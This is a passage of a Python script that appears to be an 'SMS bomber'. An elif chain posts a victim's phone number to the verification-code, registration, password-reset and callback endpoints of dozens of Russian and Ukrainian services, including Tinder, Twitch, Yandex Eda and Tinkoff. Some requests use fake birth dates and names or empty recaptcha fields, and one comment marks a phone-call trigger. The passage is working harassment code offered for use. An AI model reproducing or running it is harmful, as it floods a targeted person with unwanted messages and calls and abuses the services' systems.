        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
    elif serv == 32:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
    elif serv == 33:
        requests.post('https://plink.tech/register/', json={"phone": _phone})
    elif serv == 34:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
    elif serv == 35:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
    elif serv == 36:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone, "username": username})
    elif serv == 37:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
    elif serv == 38:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
    elif serv == 39:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
    elif serv == 40:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
    elif serv == 41:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
    elif serv == 42:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    elif serv == 44:
        requests.post('https://b.utair.ru/api/v1/login/', data={'login': _phone, }, headers={'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Host': 'b.utair.ru','origin': 'https://www.utair.ru', 'Referer': 'https://www.utair.ru/'})
    elif serv == 45:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+" + _phone,"name": "Иван","is_terms_accepted": True,})
    elif serv == 46:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": { "mphone": "+" + _phone, "bdate": "11.11.1999", "deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"},)
    elif serv == 47:
        requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php", data={"PERSONAL_MOBILE": "+" + _phone})
    elif serv == 48:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+" + _phone, "type": "authenticateCode"})
    elif serv == 49:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num": _phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call",}, )
    elif serv == 50:
        requests.post("https://hr.zarplata.ru/api/v2/users",json={ "phone": {"value": _phone},"password": password, "type": "employer", }, )
    elif serv == 51:
        requests.post("https://hr.zarplata.ru/api/v2/users", json={ "phone": {"value": _phone}, "password": password, "type": "employer", },  )
    elif serv == 52:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": _phone, "region_code": "RU"})
    elif serv == 53:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": _phone, "region_code": "UA"})
    elif serv == 54:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": _phone, "region_code": "KZ"})
    elif serv == 55:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data={"+" + _phone})
    elif serv == 56:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
    elif serv == 57:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
    elif serv == 58:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
    elif serv == 59:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
    elif serv == 60:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
    elif serv == 61:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
    elif serv == 62:
        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone})
    elif serv == 63:
        requests.post("https://zoloto585.ru/api/bcard/reg/",json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": _phone,"email": "", "city": ""})
    elif serv == 64:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": _phone})
    elif serv == 65:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login": _phone, "check": True, "crypto": {"captcha": "739699"}}})
    elif serv == 66:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website"},json={"Phone": phone, "Type": 1})
    elif serv == 67:
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "", "form[LOGIN]": phone, "form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS", "user_agreement": "on","personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"},)
    elif serv == 68:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
    elif serv == 69:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
    elif serv == 70:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
    elif serv == 71:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
    elif serv == 72:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
    elif serv == 73:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
    elif serv == 74:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
    elif serv == 75:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
    #тут звонок
    elif serv == 76:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    elif serv == 77:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
    elif serv == 78:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
    elif serv == 79:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
    elif serv == 80:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
    elif serv == 81:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
    elif serv == 82:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
    elif serv == 83:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
    elif serv == 84:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
    elif serv == 85:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
    elif serv == 86:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
    elif serv == 87:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
    elif serv == 88:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
    elif serv == 89:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
    elif serv == 90:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
    elif serv == 91:
        requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":_phone,"password":passmegafon})
    elif serv == 92:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
    elif serv == 93:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
    elif serv == 94:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
    elif serv == 95:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    elif serv == 96:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
    elif serv == 97:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
    elif serv == 98:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
    elif serv == 99:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})  
    elif serv == 100:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
    elif serv == 101:
        requests.post('https://plink.tech/register/',json={"phone": _phone})